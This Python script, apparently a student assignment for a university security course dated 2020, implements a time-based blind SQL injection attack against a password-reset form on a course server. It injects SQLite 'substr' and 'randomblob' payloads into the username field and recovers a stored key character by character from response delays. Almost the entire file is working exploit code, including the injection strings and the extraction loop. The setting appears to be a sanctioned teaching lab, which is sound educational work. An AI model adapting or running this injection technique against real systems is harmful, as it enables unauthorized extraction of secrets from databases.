# Irfansha Shaik, 03.02.2020, Aarhus

'''
Emilie Lykke Thonsgaard
Irfansha Shaik
'''

# A naive script for submitting username and accessing the response from the url:
# http://lbs-2020-02.askarov.net:3030/

'''
todos:
- First we only test with ascii from 32 to 126
- Create a file to append the identified characters in keys
'''

import requests
import time

def test_username():
  payload= {'username': 'admin', 'Submit':'submit'}
  #r = requests.get('http://lbs-2020-02.askarov.net:3030/', data=data)
  start_time = time.time()
  s = requests.post('http://lbs-2020-02.askarov.net:3030/reset/', payload)
  time_taken = (time.time() - start_time)
  # We need to assert if the resultant string is a success
  #print(r1.text)
  return time_taken

def base_injection_time():
  inject_query = "admin' AND substr(key, 1,1) = '-' AND randomblob(200000000) = 453454331000 OR 'username'='"
  #print(inject_query)
  payload= {'username': inject_query, 'Submit':'submit'}
  start_time = time.time()
  s = requests.post('http://lbs-2020-02.askarov.net:3030/reset/', payload)
  time_taken = (time.time() - start_time)
  # We need to assert if the resultant string is a success
  assert(s.text == 'password reset email has been queued')
  #print(s.text)
  return time_taken



def test_injection(char_index, test_asci):
  inject_query = "admin' AND substr(key, " + str(char_index) + ",1) = '" + str(test_asci) + "' AND randomblob(200000000) = 453454331000 OR 'username'='"
  #print(inject_query)
  payload= {'username': inject_query, 'Submit':'submit'}
  start_time = time.time()
  s = requests.post('http://lbs-2020-02.askarov.net:3030/reset/', payload)
  time_taken = (time.time() - start_time)
  # We need to assert if the resultant string is a success
  assert(s.text == 'password reset email has been queued')
  #print(s.text)
  return time_taken



def main():
  for char_index in range(35,45):
    for i in range(32,127):
      test_time = test_username()
      inject_time = test_injection(char_index, chr(i))
      if (inject_time > test_time + 2 ):
        base_time = base_injection_time()
        print("pos: ", char_index, "char: ", chr(i))
        print(test_time, base_time, inject_time)
        break


if __name__== "__main__":
  main()
